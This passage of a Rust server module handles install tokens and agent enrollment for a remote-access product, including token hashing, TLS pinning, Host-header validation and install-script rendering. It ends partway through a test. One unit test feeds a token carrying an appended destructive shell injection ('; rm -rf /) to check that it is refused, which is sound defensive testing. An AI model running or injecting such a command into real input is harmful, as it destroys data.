//! One-line agent installation.
//!
//! An admin makes an *install token* (`lit_…`) on the web, with an expiry and
//! optionally a largest number of computers, and copies a command that
//! fetches `/install/agent.sh` or `/install/agent.ps1` from this server and
//! runs it with the token. The script installs the agent from the GitHub
//! release of this server's version and runs `lunaris-agent --enroll`, which
//! saves the server address, the token and a new agent key.
//!
//! The agent then registers on `/ws/agent` with `install_token` instead of
//! the server's agent token: a valid token counts one use and stores the
//! agent's key for its new host id, marking the host `enrolled`. From then on
//! the agent signs in with its key alone (no token at all). The server's own
//! agent token never leaves the server, so a leaked script or command gives
//! at most a token that expires, runs out, or is revoked.
//!
//! Only the SHA-256 of a token is kept.

use axum::{
    extract::{Path, State},
    http::{header, HeaderMap, HeaderValue, StatusCode},
    response::{IntoResponse, Response},
    Json,
};
use serde::Deserialize;
use sqlx::SqlitePool;
use std::sync::Arc;
use tracing::{error, info};

use crate::{auth::AdminUser, security, signaling::SignalingState};

mod sums;

/// Prefix of install tokens (easy to recognise in logs and leaks).
pub const TOKEN_PREFIX: &str = "lit_";
pub const MAX_LABEL_CHARS: usize = 64;
pub const MAX_VALID_HOURS: i64 = 720;
pub const MAX_MAX_USES: i64 = 100_000;

/// A new token: the prefix and 32 random bytes as hex.
fn new_token() -> String {
    format!("{TOKEN_PREFIX}{}", security::random_hex(32))
}

/// Shape check before any database work: `lit_` and 16 to 128 characters of
/// `[A-Za-z0-9_-]` (what the scripts accept too).
pub fn plausible_token(token: &str) -> bool {
    token
        .strip_prefix(TOKEN_PREFIX)
        .is_some_and(|rest| {
            (16..=128).contains(&rest.len()) && rest.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
        })
}

fn db_error(e: sqlx::Error) -> (StatusCode, Json<serde_json::Value>) {
    error!("Database error: {}", e);
    (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "Internal Database Error" })))
}

fn bad_request(msg: &str) -> (StatusCode, Json<serde_json::Value>) {
    (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg })))
}

// ---- Admin API ---------------------------------------------------------------

#[derive(Deserialize)]
pub struct CreateInstallToken {
    #[serde(default)]
    pub label: String,
    pub valid_hours: i64,
    #[serde(default)]
    pub max_uses: Option<i64>,
}

type TokenRow = (String, String, String, String, Option<i64>, i64, i64);


fn token_json((id, label, created_at, expires_at, max_uses, uses, revoked): TokenRow) -> serde_json::Value {
    serde_json::json!({
        "id": id,
        "label": label,
        "created_at": created_at,
        "expires_at": expires_at,
        "max_uses": max_uses,
        "uses": uses,
        "revoked": revoked != 0,
    })
}

// POST /api/admin/install-tokens
pub async fn create_token(
    admin: AdminUser,
    State(state): State<Arc<SignalingState>>,
    uri: axum::http::Uri,
    headers: HeaderMap,
    extensions: axum::http::Extensions,
    Json(req): Json<CreateInstallToken>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    let label = req.label.trim().to_string();
    if label.chars().count() > MAX_LABEL_CHARS {
        return Err(bad_request("The label is longer than 64 characters"));
    }
    if label.chars().any(char::is_control) {
        return Err(bad_request("The label has control characters"));
    }
    if !(1..=MAX_VALID_HOURS).contains(&req.valid_hours) {
        return Err(bad_request("valid_hours must be from 1 to 720"));
    }
    if req.max_uses.is_some_and(|m| !(1..=MAX_MAX_USES).contains(&m)) {
        return Err(bad_request("max_uses must be at least 1 (or null for no limit)"));
    }
    let id = uuid::Uuid::new_v4().to_string();
    let token = new_token();
    sqlx::query(
        "INSERT INTO install_tokens (id, token_hash, label, created_by, created_at, expires_at, max_uses)
         VALUES (?, ?, ?, ?, datetime('now'), datetime('now', ?), ?)",
    )
    .bind(&id)
    .bind(security::sha256_hex(&token))
    .bind(&label)
    .bind(&admin.user_id)
    .bind(format!("+{} hours", req.valid_hours))
    .bind(req.max_uses)
    .execute(&state.db)
    .await
    .map_err(db_error)?;
    let row: TokenRow = sqlx::query_as("SELECT id, label, created_at, expires_at, max_uses, uses, revoked FROM install_tokens WHERE id = ?")
        .bind(&id)
        .fetch_one(&state.db)
        .await
        .map_err(db_error)?;
    info!("Admin {} created install token {} ({})", admin.username, id, if label.is_empty() { "no label" } else { &label });
    let mut body = token_json(row);
    // The only time the token itself is shown.
    body["token"] = serde_json::Value::String(token);
    // Where the command fetches the script from, and how it checks it is
    // this server (the web builds the command with these).
    let (via_tls, peer) = request_origin(&extensions);
    body["install"] = install_fetch(
        &headers,
        uri.authority().map(|a| a.as_str()),
        peer,
        via_tls,
        crate::tls::https_port(),
        own_tls_pins().as_ref(),
    );
    Ok((StatusCode::CREATED, Json(body)))
}

// GET /api/admin/install-fetch
/// How a command fetches the install script, without making a token: for
/// the update commands (`agent.sh --update`, `agent.ps1 -Update`, which need
/// none), and the version they install (this server's).
pub async fn fetch_info(
    _admin: AdminUser,
    uri: axum::http::Uri,
    headers: HeaderMap,
    extensions: axum::http::Extensions,
) -> impl IntoResponse {
    let (via_tls, peer) = request_origin(&extensions);
    Json(serde_json::json!({
        "version": env!("CARGO_PKG_VERSION"),
        "install": install_fetch(
            &headers,
            uri.authority().map(|a| a.as_str()),
            peer,
            via_tls,
            crate::tls::https_port(),
            own_tls_pins().as_ref(),
        ),
    }))
}

// GET /api/admin/install-tokens
pub async fn list_tokens(
    _admin: AdminUser,
    State(state): State<Arc<SignalingState>>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    let rows: Vec<TokenRow> =
        sqlx::query_as("SELECT id, label, created_at, expires_at, max_uses, uses, revoked FROM install_tokens ORDER BY created_at DESC, id")
            .fetch_all(&state.db)
            .await
            .map_err(db_error)?;
    Ok(Json(rows.into_iter().map(token_json).collect::<Vec<_>>()))
}

// DELETE /api/admin/install-tokens/{id}
/// Revokes the token: no more computers join with it. Computers that joined
/// keep their keys (remove them as hosts to shut them out).
pub async fn revoke_token(
    admin: AdminUser,
    State(state): State<Arc<SignalingState>>,
    Path(id): Path<String>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    let done = sqlx::query("UPDATE install_tokens SET revoked = 1 WHERE id = ?")
        .bind(&id)
        .execute(&state.db)
        .await
        .map_err(db_error)?;
    if done.rows_affected() == 0 {
        return Err((StatusCode::NOT_FOUND, Json(serde_json::json!({ "error": "Install token not found" }))));
    }
    info!("Admin {} revoked install token {}", admin.username, id);
    Ok(StatusCode::NO_CONTENT)
}

// ---- Agent sign-in without the server's agent token ---------------------------

#[derive(Debug, PartialEq, Eq)]
pub enum Outcome {
    /// An enrolled host with its key (key alone, or again with a token).
    Accepted,
    /// Joined now with an install token; `counted`: one use was spent.
    Enrolled { counted: bool },
    Rejected(&'static str),
}

/// An agent registering without the server's agent token: with its `key`
/// (already checked to be well-formed) and possibly an `install_token`.
/// `keyless_online`: an agent without a key is connected with this id now.
///
/// - A host that has this key and is enrolled: accepted (no use spent, the
///   token is not even looked at — re-running the installer is free).
/// - A host that has this key but joined with the agent token: accepted and
///   marked enrolled when the install token is valid, without spending a use.
/// - A host with another key: refused (no take-over).
/// - No key stored for the id (new computer, or after "reset key"): needs a
///   valid install token with a use left; the use is spent and the key
///   stored in one transaction.
/// - Key alone for a host that isn't enrolled or doesn't exist: refused.
pub async fn authorize(
    db: &SqlitePool,
    host_id: &str,
    name: &str,
    key: &str,
    install_token: Option<&str>,
    keyless_online: bool,
) -> Result<Outcome, sqlx::Error> {
    let key_hash = security::sha256_hex(key);
    let host: Option<(Option<String>, i64)> = sqlx::query_as("SELECT agent_key_hash, enrolled FROM hosts WHERE id = ?")
        .bind(host_id)
        .fetch_optional(db)
        .await?;
    let install_token = install_token.filter(|t| !t.is_empty());

    if let Some((Some(stored), enrolled)) = &host {
        if !security::ct_eq(stored, &key_hash) {
            return Ok(Outcome::Rejected("another key is registered for this host id"));
        }
        if *enrolled != 0 {
            return Ok(Outcome::Accepted);
        }
        let Some(token) = install_token else {
            return Ok(Outcome::Rejected("this host did not join with an install token"));
        };
        let Some(token_id) = usable_token(db, token).await? else {
            return Ok(Outcome::Rejected("invalid, expired or revoked install token"));
        };
        sqlx::query("UPDATE hosts SET enrolled = 1, install_token_id = ? WHERE id = ?")
            .bind(&token_id)
            .bind(host_id)
            .execute(db)
            .await?;
        return Ok(Outcome::Enrolled { counted: false });
    }

    // No key stored for this id.
    let Some(token) = install_token else {
        return Ok(Outcome::Rejected("unknown host (key alone is only for computers that joined)"));
    };
    if keyless_online {
        return Ok(Outcome::Rejected("an agent without a key is online with this id"));
    }
    if !plausible_token(token) {
        return Ok(Outcome::Rejected("invalid install token"));
    }
    let token_hash = security::sha256_hex(token);
    let found: Option<(String, String)> = sqlx::query_as("SELECT id, token_hash FROM install_tokens WHERE token_hash = ?")
        .bind(&token_hash)
        .fetch_optional(db)
        .await?;
    // The lookup is by hash (an index walk learns nothing about the token);
    // compared again in constant time all the same.
    let Some((token_id, _)) = found.filter(|(_, h)| security::ct_eq(h, &token_hash)) else {
        return Ok(Outcome::Rejected("invalid install token"));
    };
    // The transaction starts with a write, so it waits for SQLite's write
    // lock (busy_timeout). Reading first and then writing fails at once with
    // SQLITE_BUSY when another connection wrote in between (WAL), which is
    // what many agents joining or reconnecting together do.
    let mut tx = db.begin().await?;
    let spent = sqlx::query(
        "UPDATE install_tokens SET uses = uses + 1
         WHERE id = ? AND revoked = 0 AND expires_at > datetime('now')
           AND (max_uses IS NULL OR uses < max_uses)",
    )
    .bind(&token_id)
    .execute(&mut *tx)
    .await?;
    if spent.rows_affected() != 1 {
        return Ok(Outcome::Rejected("install token expired, revoked or used up"));
    }
    // A new host id, or a host that joined with an install token before and
    // whose key an admin reset (admin.rs `reset_host_key` keeps its
    // install_token_id): two agents racing for one id can't both win, and an
    // install token never takes over another listed host (one that joined
    // with the main token and has no key yet is claimed through the main
    // token, as before; otherwise whoever holds an install token could stand
    // in for it while it is offline).
    let stored = sqlx::query(
        "INSERT INTO hosts (id, name, status, agent_key_hash, enrolled, install_token_id)
         VALUES (?, ?, 'Offline', ?, 1, ?)
         ON CONFLICT(id) DO UPDATE SET agent_key_hash = excluded.agent_key_hash, enrolled = 1,
             install_token_id = excluded.install_token_id
         WHERE hosts.agent_key_hash IS NULL AND hosts.install_token_id IS NOT NULL",
    )
    .bind(host_id)
    .bind(name)
    .bind(&key_hash)
    .bind(&token_id)
    .execute(&mut *tx)
    .await?;
    if stored.rows_affected() != 1 {
        // Dropping the transaction rolls the use back.
        return Ok(Outcome::Rejected("another agent took this host id"));
    }
    tx.commit().await?;
    Ok(Outcome::Enrolled { counted: true })
}

/// The id of a valid (not revoked, not expired) token, uses not considered.
async fn usable_token(db: &SqlitePool, token: &str) -> Result<Option<String>, sqlx::Error> {
    if !plausible_token(token) {
        return Ok(None);
    }
    let hash = security::sha256_hex(token);
    let row: Option<(String, String)> = sqlx::query_as(
        "SELECT id, token_hash FROM install_tokens
         WHERE token_hash = ? AND revoked = 0 AND expires_at > datetime('now')",
    )
    .bind(&hash)
    .fetch_optional(db)
    .await?;
    Ok(row.filter(|(_, h)| security::ct_eq(h, &hash)).map(|(id, _)| id))
}

// ---- Install scripts -----------------------------------------------------------

const SH_TEMPLATE: &str = include_str!("install/agent.sh");
const PS1_TEMPLATE: &str = include_str!("install/agent.ps1");

/// What a script is made with.
#[derive(Debug, PartialEq, Eq)]
pub struct ScriptValues {
    /// Where the agent connects: `ws://host:port` or `wss://host:port`.
    pub server_url: String,
    pub version: String,
    /// Pin for the agent: the certificate of this server's own HTTPS
    /// listener, when the agent is sent there.
    pub cert_sha256: Option<String>,
}

/// The release files the scripts install, by their placeholder.
fn release_files(version: &str) -> [(&'static str, String); 4] {
    [
        ("@@SHA256_AGENT_DEB@@", format!("lunaris-agent_{version}_amd64.deb")),
        ("@@SHA256_HELPER_DEB@@", format!("lunaris-approval-helper_{version}_amd64.deb")),
        ("@@SHA256_APPIMAGE@@", "lunaris-agent-linux-x86_64.AppImage".to_string()),
        ("@@SHA256_INSTALLER@@", "lunaris-agent-installer-windows.exe".to_string()),
    ]
}

/// This server's own HTTPS listener, as clients pin it: the SHA-256 of its
/// certificate (hex, what the agent and PowerShell compare) and of its
/// public key (base64, curl's `--pinnedpubkey sha256//...`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TlsPins {
    pub cert_sha256: String,
    pub spki_sha256_b64: String,
}

/// The pins of the certificate the HTTPS listener serves, read from the same
/// file tls.rs loaded (and checked to be that certificate); None when HTTPS
/// is off or the file can't be read.
fn own_tls_pins() -> Option<TlsPins> {
    static PINS: std::sync::OnceLock<Option<TlsPins>> = std::sync::OnceLock::new();
    let served = crate::tls::served_cert_sha256()?;
    PINS.get_or_init(|| {
        // As tls.rs `cert_paths`: the admin's certificate or the self-signed one.
        let path = match (std::env::var("LUNARIS_TLS_CERT"), std::env::var("LUNARIS_TLS_KEY")) {
            (Ok(c), Ok(k)) if !c.is_empty() && !k.is_empty() => std::path::PathBuf::from(c),
            _ => crate::paths::data_file("tls_cert.pem"),
        };
        let file = std::fs::File::open(&path).ok()?;
        let leaf = rustls_pemfile::certs(&mut std::io::BufReader::new(file)).next()?.ok()?;
        let pins = tls_pins(leaf.as_ref())?;
        if pins.cert_sha256 != served {
            error!("Install command: {} is not the certificate the HTTPS listener serves", path.display());
            return None;
        }
        Some(pins)
    })
    .clone()
}

fn tls_pins(cert_der: &[u8]) -> Option<TlsPins> {
    use sha2::Digest;
    let spki = spki_of(cert_der)?;
    Some(TlsPins {
        cert_sha256: hex::encode(sha2::Sha256::digest(cert_der)),
        spki_sha256_b64: sums::base64(&sha2::Sha256::digest(spki)),
    })
}

/// One DER element: (tag, the whole element, its content, what follows).
fn der_next(data: &[u8]) -> Option<(u8, &[u8], &[u8], &[u8])> {
    let tag = *data.first()?;
    let first = *data.get(1)?;
    let (len, head) = if first < 0x80 {
        (first as usize, 2)
    } else {
        let n = (first & 0x7f) as usize;
        if n == 0 || n > 4 {
            return None;
        }
        let mut len = 0usize;
        for b in data.get(2..2 + n)? {
            len = (len << 8) | *b as usize;
        }
        (len, 2 + n)
    };
    let end = head.checked_add(len)?;
    let whole = data.get(..end)?;
    Some((tag, whole, &whole[head..], &data[end..]))
}

/// The SubjectPublicKeyInfo of an X.509 certificate (RFC 5280: Certificate
/// { tbsCertificate { [0] version, serial, signature, issuer, validity,
/// subject, subjectPublicKeyInfo, ... } }).
fn spki_of(cert_der: &[u8]) -> Option<&[u8]> {
    let (0x30, _, cert, _) = der_next(cert_der)? else { return None };
    let (0x30, _, mut tbs, _) = der_next(cert)? else { return None };
    if tbs.first() == Some(&0xa0) {
        tbs = der_next(tbs)?.3;
    }
    // serial, signature, issuer, validity, subject
    for _ in 0..5 {
        tbs = der_next(tbs)?.3;
    }
    let (0x30, spki, _, _) = der_next(tbs)? else { return None };
    Some(spki)
}

/// Whether the request came over this server's HTTPS listener, and from whom.
fn request_origin(extensions: &axum::http::Extensions) -> (bool, Option<std::net::IpAddr>) {
    let via_tls = extensions.get::<crate::tls::ViaTls>().is_some();
    let peer = extensions
        .get::<axum::extract::ConnectInfo<crate::signaling::ConnAddrs>>()
        .map(|c| c.0.remote.ip());
    (via_tls, peer)
}

/// `host[:port]` from a Host header: a DNS name or IPv4 address, or an IPv6
/// address in brackets, and a port. Anything else (spaces, quotes, `$`, `/`,
/// user info, ...) is refused, so the value is safe inside the scripts.
pub fn valid_host(value: &str) -> Option<String> {
    if value.is_empty() || value.len() > 300 {
        return None;
    }
    let (host, port) = if let Some(rest) = value.strip_prefix('[') {
        let end = rest.find(']')?;
        let addr = &rest[..end];
        if addr.is_empty() || !addr.bytes().all(|b| b.is_ascii_hexdigit() || b == b':' || b == b'.') {
            return None;
        }
        addr.parse::<std::net::Ipv6Addr>().ok()?;
        (&value[..end + 2], &rest[end + 1..])
    } else {
        match value.rsplit_once(':') {
            Some((h, _)) => (h, &value[h.len()..]),
            None => (value, ""),
        }
    };
    if !host.starts_with('[') {
        if host.is_empty() || host.len() > 253 || host.starts_with('-') || host.starts_with('.') {
            return None;
        }
        if !host.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'.') {
            return None;
        }
    }
    match port {
        "" => {}
        _ => {
            let digits = port.strip_prefix(':')?;
            if digits.is_empty() || digits.len() > 5 || !digits.bytes().all(|b| b.is_ascii_digit()) {
                return None;
            }
            let n: u32 = digits.parse().ok()?;
            if n == 0 || n > 65535 {
                return None;
            }
        }
    }
    Some(value.to_ascii_lowercase())
}

/// The last value of a header (what a proxy on this machine set or appended).
fn last_header<'a>(headers: &'a HeaderMap, name: &str) -> Option<&'a str> {
    headers
        .get_all(name)
        .iter()
        .filter_map(|v| v.to_str().ok())
        .flat_map(|v| v.split(','))
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .next_back()
}

/// How the request reached this server.
#[derive(Debug, PartialEq, Eq)]
enum Reached {
    /// A reverse proxy on this machine, with the scheme it was reached by.
    Proxy { https: bool },
    /// This server's own HTTPS listener.
    OwnTls,
    /// Plain HTTP, straight.
    Plain,
}

/// The host (and port) the request was made to, and how it came.
fn reached(
    headers: &HeaderMap,
    uri_authority: Option<&str>,
    peer: Option<std::net::IpAddr>,
    via_tls: bool,
) -> Result<(String, Reached), &'static str> {
    let from_proxy = peer.is_some_and(|p| match p {
        std::net::IpAddr::V4(v4) => v4.is_loopback(),
        std::net::IpAddr::V6(v6) => v6.is_loopback() || v6.to_ipv4_mapped().is_some_and(|v4| v4.is_loopback()),
    }) && !via_tls;
    let forwarded_proto = if from_proxy { last_header(headers, "x-forwarded-proto") } else { None };
    let forwarded_host = if from_proxy { last_header(headers, "x-forwarded-host") } else { None };
    let host_header = headers.get(header::HOST).and_then(|v| v.to_str().ok());
    let raw_host = forwarded_host.or(host_header).or(uri_authority).ok_or("no Host header")?;
    let host = valid_host(raw_host.trim()).ok_or("bad Host header")?;
    let how = match forwarded_proto.map(str::to_ascii_lowercase).as_deref() {
        Some("https") => Reached::Proxy { https: true },
        Some("http") => Reached::Proxy { https: false },
        Some(_) => return Err("bad X-Forwarded-Proto header"),
        None if via_tls => Reached::OwnTls,
        None => Reached::Plain,
    };
    Ok((host, how))
}

/// `host[:port]` (checked by [`valid_host`]) without the port.
fn without_port(host: &str) -> &str {
    if host.starts_with('[') {
        host.find(']').map_or(host, |i| &host[..=i])
    } else {
        host.rsplit_once(':').map_or(host, |(h, _)| h)
    }
}

fn plausible_fingerprint(cert: &str) -> bool {
    cert.len() == 64 && cert.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Works out the script's values from the request, as the web works out the
/// agent's server address: the address the browser (here: curl) used.
/// - Through a reverse proxy on this machine (peer is loopback and sent
///   `X-Forwarded-Proto`/`-Host`): its scheme and host, `wss` for https.
/// - On this server's own HTTPS listener: `wss` to the same host and port,
///   with that certificate's SHA-256 for the agent to pin.
/// - Plain HTTP: `wss` to the same host on the HTTPS port (`https_port`),
///   with the pin, so the agent's connection is encrypted and checked even
///   when the script came over plain HTTP; `ws` only when this server has no
///   HTTPS listener.
pub fn script_values(
    headers: &HeaderMap,
    uri_authority: Option<&str>,
    peer: Option<std::net::IpAddr>,
    via_tls: bool,
    https_port: Option<u16>,
    served_cert: Option<&str>,
) -> Result<ScriptValues, &'static str> {
    let (host, how) = reached(headers, uri_authority, peer, via_tls)?;
    if served_cert.is_some_and(|c| !plausible_fingerprint(c)) {
        return Err("bad certificate fingerprint");
    }
    let (server_url, cert) = match (how, https_port, served_cert) {
        (Reached::Proxy { https: true }, _, _) => (format!("wss://{host}"), None),
        (Reached::Proxy { https: false }, _, _) => (format!("ws://{host}"), None),
        (Reached::OwnTls, _, cert) => (format!("wss://{host}"), cert.map(str::to_owned)),
        (Reached::Plain, Some(port), Some(cert)) => (format!("wss://{}:{port}", without_port(&host)), Some(cert.to_owned())),
        (Reached::Plain, _, _) => (format!("ws://{host}"), None),
    };
    Ok(ScriptValues { server_url, version: env!("CARGO_PKG_VERSION").to_string(), cert_sha256: cert })
}

/// How the install command fetches the script (POST /api/admin/install-tokens
/// answers it with the token, the web builds the command from it):
/// - `script_origin`: an https origin to fetch it from, or null when there is
///   none (only plain HTTP: the page says that the script is not protected);
/// - `spki_sha256` / `cert_sha256`: this server's own HTTPS listener, for
///   curl `--pinnedpubkey` and the PowerShell certificate check (its
///   certificate is often self-signed); null through a reverse proxy, whose
///   certificate the computers check as usual.
pub fn install_fetch(
    headers: &HeaderMap,
    uri_authority: Option<&str>,
    peer: Option<std::net::IpAddr>,
    via_tls: bool,
    https_port: Option<u16>,
    own: Option<&TlsPins>,
) -> serde_json::Value {
    let pinned = |origin: String, pins: &TlsPins| {
        serde_json::json!({ "script_origin": origin, "spki_sha256": pins.spki_sha256_b64, "cert_sha256": pins.cert_sha256 })
    };
    let none = serde_json::json!({ "script_origin": null, "spki_sha256": null, "cert_sha256": null });
    match reached(headers, uri_authority, peer, via_tls) {
        Ok((host, Reached::Proxy { https: true })) => {
            serde_json::json!({ "script_origin": format!("https://{host}"), "spki_sha256": null, "cert_sha256": null })
        }
        Ok((host, Reached::OwnTls)) => match own {
            Some(pins) => pinned(format!("https://{host}"), pins),
            None => none,
        },
        Ok((host, Reached::Plain)) => match (https_port, own) {
            (Some(port), Some(pins)) => pinned(format!("https://{}:{port}", without_port(&host)), pins),
            _ => none,
        },
        _ => none,
    }
}

/// The template with the values filled in. Everything put in is checked to
/// hold only `[A-Za-z0-9.:/\[\]+=-]` (no quote, no `$`, no space), so it
/// can't break out of the quotes. `sums`: the release's verified
/// SHA256SUMS, when the server could get it: the expected SHA-256 of each
/// file is written in (empty otherwise: the script checks the list itself).
pub fn render(template: &str, values: &ScriptValues, sums: Option<&[u8]>) -> String {
    let mut out = template
        .replace("@@SERVER_URL@@", &values.server_url)
        .replace("@@VERSION@@", &values.version)
        .replace("@@CERT_SHA256@@", values.cert_sha256.as_deref().unwrap_or(""))
        .replace("@@RELEASE_KEY@@", &sums::release_key_spki_b64());
    for (placeholder, name) in release_files(&values.version) {
        let digest = sums.and_then(|s| sums::sha256_of(s, &name)).unwrap_or_default();
        out = out.replace(placeholder, &digest);
    }
    out
}

async fn script_response(req: axum::extract::Request, template: &str) -> Response {
    let (via_tls, peer) = request_origin(req.extensions());
    let authority = req.uri().authority().map(|a| a.as_str().to_string());
    let values = script_values(
        req.headers(),
        authority.as_deref(),
        peer,
        via_tls,
        crate::tls::https_port(),
        crate::tls::served_cert_sha256(),
    );
    let no_store = [
        (header::CONTENT_TYPE, HeaderValue::from_static("text/plain; charset=utf-8")),
        (header::CACHE_CONTROL, HeaderValue::from_static("no-store")),
    ];
    match values {
        Ok(v) => {
            let sums = sums::verified_sums(&v.version).await;
            (StatusCode::OK, no_store, render(template, &v, sums.as_deref().map(Vec::as_slice))).into_response()
        }
        Err(why) => (StatusCode::BAD_REQUEST, no_store, format!("error: {why}\n")).into_response(),
    }
}

// GET /install/agent.sh
pub async fn agent_sh(req: axum::extract::Request) -> Response {
    script_response(req, SH_TEMPLATE).await
}

// GET /install/agent.ps1
pub async fn agent_ps1(req: axum::extract::Request) -> Response {
    script_response(req, PS1_TEMPLATE).await
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::tests::test_db;

    const KEY: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    const OTHER_KEY: &str = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async fn add_token(db: &SqlitePool, expires: &str, max_uses: Option<i64>, revoked: bool) -> String {
        let token = new_token();
        sqlx::query(
            "INSERT INTO install_tokens (id, token_hash, label, expires_at, max_uses, revoked)
             VALUES (?, ?, 'test', datetime('now', ?), ?, ?)",
        )
        .bind(uuid::Uuid::new_v4().to_string())
        .bind(security::sha256_hex(&token))
        .bind(expires)
        .bind(max_uses)
        .bind(revoked as i64)
        .execute(db)
        .await
        .unwrap();
        token
    }

    async fn uses(db: &SqlitePool, token: &str) -> i64 {
        sqlx::query_scalar("SELECT uses FROM install_tokens WHERE token_hash = ?")
            .bind(security::sha256_hex(token))
            .fetch_one(db)
            .await
            .unwrap()
    }

    async fn auth(db: &SqlitePool, id: &str, key: &str, token: Option<&str>) -> Outcome {
        authorize(db, id, "PC", key, token, false).await.unwrap()
    }

    #[test]
    fn tokens_look_right() {
        let t = new_token();
        assert!(t.starts_with("lit_") && t.len() == 4 + 64);
        assert!(plausible_token(&t));
        assert!(!plausible_token("lit_short"));
        assert!(!plausible_token(&format!("xyz_{}", &t[4..])));
        assert!(!plausible_token(&format!("{t}'; rm -rf /")));
    }

    #[tokio::test]
    async fn valid_token_enrolls_once_per_computer() {
        let db = test_db().await;
        let token = add_token(&db, "+1 hours", Some(2), false).await;
        assert_eq!(auth(&db, "pc-1", KEY, Some(&token)).await, Outcome::Enrolled { counted: true });
        assert_eq!(uses(&db, &token).await, 1);
        let (enrolled, key_hash): (i64, String) =
            sqlx::query_as("SELECT enrolled, agent_key_hash FROM hosts WHERE id = 'pc-1'").fetch_one(&db).await.unwrap();
        assert_eq!(enrolled, 1);
        assert_eq!(key_hash, security::sha256_hex(KEY));
        // The installer run again on the same computer: no second use.
        assert_eq!(auth(&db, "pc-1", KEY, Some(&token)).await, Outcome::Accepted);
        assert_eq!(uses(&db, &token).await, 1);
        // Afterwards the key alone signs in.
        assert_eq!(auth(&db, "pc-1", KEY, None).await, Outcome::Accepted);
        // The same id with another key: no take-over, with or without a token.
        assert!(matches!(auth(&db, "pc-1", OTHER_KEY, Some(&token)).await, Outcome::Rejected(_)));
        assert!(matches!(auth(&db, "pc-1", OTHER_KEY, None).await, Outcome::Rejected(_)));
        assert_eq!(uses(&db, &token).await, 1);
    }

    #[tokio::test]
    async fn use_counter_stops_at_max_uses() {
        let db = test_db().await;
        let token = add_token(&db, "+1 hours", Some(2), false).await;
        assert_eq!(auth(&db, "a", KEY, Some(&token)).await, Outcome::Enrolled { counted: true });
        assert_eq!(auth(&db, "b", KEY, Some(&token)).await, Outcome::Enrolled { counted: true });
        assert!(matches!(auth(&db, "c", KEY, Some(&token)).await, Outcome::Rejected(_)));
        assert_eq!(uses(&db, &token).await, 2);
        // Nothing was made for the refused computer.
        let c: Option<String> = sqlx::query_scalar("SELECT id FROM hosts WHERE id = 'c'").fetch_optional(&db).await.unwrap();
        assert!(c.is_none());
        // Without a limit it keeps counting.
        let open = add_token(&db, "+1 hours", None, false).await;
        for i in 0..5 {
            assert_eq!(auth(&db, &format!("u{i}"), KEY, Some(&open)).await, Outcome::Enrolled { counted: true });
        }
        assert_eq!(uses(&db, &open).await, 5);
    }

    #[tokio::test]
    async fn expired_revoked_and_unknown_tokens_are_refused() {
        let db = test_db().await;
        let expired = add_token(&db, "-1 minutes", None, false).await;
        let revoked = add_token(&db, "+1 hours", None, true).await;
        assert!(matches!(auth(&db, "x", KEY, Some(&expired)).await, Outcome::Rejected(_)));
        assert!(matches!(auth(&db, "x", KEY, Some(&revoked)).await, Outcome::Rejected(_)));
        assert!(matches!(auth(&db, "x", KEY, Some(&new_token())).await, Outcome::Rejected(_)));
        assert!(matches!(auth(&db, "x", KEY, Some("lit_garbage")).await, Outcome::Rejected(_)));
        assert_eq!(uses(&db, &expired).await, 0);
        assert_eq!(uses(&db, &revoked).await, 0);
        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM hosts").fetch_one(&db).await.unwrap();
        assert_eq!(count, 0);
    }

    #[tokio::test]
    async fn key_alone_only_for_enrolled_hosts() {
        let db = test_db().await;
        // Unknown host: refused, and nothing is created.
        assert!(matches!(auth(&db, "new", KEY, None).await, Outcome::Rejected(_)));
        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM hosts").fetch_one(&db).await.unwrap();
        assert_eq!(count, 0);
        // A host that joined with the agent token (key stored, not enrolled):
        // its key alone is not enough.
        sqlx::query("INSERT INTO hosts (id, name, status, agent_key_hash) VALUES ('old', 'Old', 'Offline', ?)")
            .bind(security::sha256_hex(KEY))
            .execute(&db)
            .await
            .unwrap();
        assert!(matches!(auth(&db, "old", KEY, None).await, Outcome::Rejected(_)));
        // With a valid install token it becomes enrolled without spending a use.
        let token = add_token(&db, "+1 hours", Some(1), false).await;
        assert_eq!(auth(&db, "old", KEY, Some(&token)).await, Outcome::Enrolled { counted: false });
        assert_eq!(uses(&db, &token).await, 0);
        assert_eq!(auth(&db, "old", KEY, None).await, Outcome::Accepted);
        // A host without a key while a keyless agent is online: not claimed.
        sqlx::query("INSERT INTO hosts (id, name, status) VALUES ('legacy', 'L', 'Online')").execute(&db).await.unwrap();
        let r = authorize(&db, "legacy", "L", KEY, Some(&token), true).await.unwrap();
        assert!(matches!(r, Outcome::Rejected(_)));
        assert_eq!(uses(&db, &token).await, 0);
        // An enrolled host whose key an admin reset: the key alone stops working.
        sqlx::query("UPDATE hosts SET agent_key_hash = NULL, enrolled = 0 WHERE id = 'old'").execute(&db).await.unwrap();
        assert!(matches!(auth(&db, "old", KEY, None).await, Outcome::Rejected(_)));
    }

    /// Many computers joining at once (a lab installed together, or all of
    /// them reconnecting after a server restart) while other writes go on:
    /// each one waits for SQLite's write lock instead of failing with
    /// SQLITE_BUSY ("database is locked", a 500 for the agent).
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn concurrent_joins_dont_fail_on_the_lock() {
        let db = test_db().await;
        let token = add_token(&db, "+1 hours", None, false).await;
        let mut tasks = Vec::new();
        for i in 0..24 {
            let (db, token) = (db.clone(), token.clone());
            tasks.push(tokio::spawn(async move {
                // Other agents going online meanwhile (signaling.rs writes too).
                sqlx::query("UPDATE install_tokens SET label = label WHERE token_hash = 'x'").execute(&db).await.unwrap();
                authorize(&db, &format!("pc-{i}"), "PC", KEY, Some(&token), false).await
            }));
        }
        for t in tasks {
